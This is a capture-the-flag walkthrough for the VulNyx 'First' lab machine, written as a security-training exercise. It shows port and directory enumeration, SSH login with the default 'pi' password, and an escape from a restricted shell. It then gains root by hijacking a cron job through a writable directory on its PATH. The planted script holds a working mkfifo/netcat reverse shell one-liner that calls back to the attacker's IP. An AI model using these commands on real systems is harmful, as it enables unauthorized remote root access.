# VulNyx - First

## Information

## Solution
### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sCV -T4 -p- 192.168.11.13
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-05 17:59 +07
Nmap scan report for 192.168.11.13
Host is up (0.00096s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 24:83:97:49:96:11:7c:7a:54:00:17:3b:0c:f6:e1:54 (RSA)
|   256 83:cc:d0:72:41:48:fc:c4:ba:46:a1:0e:70:50:52:71 (ECDSA)
|_  256 a0:37:99:32:78:17:69:4f:1d:ac:75:1e:ba:19:58:45 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Debian Default Page: It works
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|_  nodes: 
MAC Address: 08:00:27:6E:7C:5E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.07 seconds
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://192.168.11.13/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.11.13/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 13150 / 220558 (5.96%)[ERROR] error on word Secure: timeout occurred during the request
/tasklist             (Status: 200) [Size: 137]
/server-status        (Status: 403) [Size: 278]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```
![tasklist](/walkthroughs/vulnyx/low-difficulty/first/web-tasklist.png)

### Shell (pi)
![raspberry infomation](/walkthroughs/vulnyx/low-difficulty/first/raspberry-info.png)
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh pi@192.168.11.13                
The authenticity of host '192.168.11.13 (192.168.11.13)' can't be established.
ED25519 key fingerprint is: SHA256:/4sHdLc0MGAL7xya9kIEs8V1Coyl7RG+QaK9LssRo34
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.11.13' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
pi@192.168.11.13's password: 

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberry:~ $ id ; hostname
uid=1000(pi) gid=1000(pi) grupos=1000(pi)
raspberry
```

```bash
pi@raspberry:~ $ cd
-rbash: cd: restringido
```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh pi@192.168.11.13 -t 'bash --noprofile'
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
pi@192.168.11.13's password: 
pi@raspberry:~ $ cd
pi@raspberry:~ $ 
```

### Privilege Escalation
#### Enumeration
```bash
pi@raspberry:/var/www/html $ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/var/www/html:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * * root ping -c1 raspberrypi.com

pi@raspberry:/ $ ls -ld /var/www/html/
drwxrwxrwx 2 www-data www-data 4096 may  5 18:12 /var/www/html/
```

#### Abuse
```bash
pi@raspberry:~ $ cd /var/www/html
pi@raspberry:/var/www/html $ nano ping
pi@raspberry:/var/www/html $ cat ping
#!/bin/bash
rm tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.11.10 4444 > /tmp/f
pi@raspberry:/var/www/html $ chmod +x ping
pi@raspberry:/var/www/html $ ls -la
total 28
drwxrwxrwx 2 www-data www-data  4096 may  5 18:06 .
drwxrwxrwx 3 www-data www-data  4096 nov 11  2023 ..
-rwxrwxrwx 1 www-data www-data 10701 nov 11  2023 index.html
-rwxr-xr-x 1 pi       pi          91 may  5 18:06 ping
-rwxrwxrwx 1 www-data www-data   137 ene  7  2024 tasklist
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.11.10] from (UNKNOWN) [192.168.11.13] 51860
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) grupos=0(root)
# hostname
raspberry
```

#### Flags
```bash
# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@raspberry:~# find / -name root.txt -o -name user.txt 2>/dev/null | xargs cat
< root.txt -o -name user.txt 2>/dev/null | xargs cat
09a8a707111af965e56c59c573ac5244
a4a7e60b8de265bae9283b46202602e9
```
***You are welcome!***
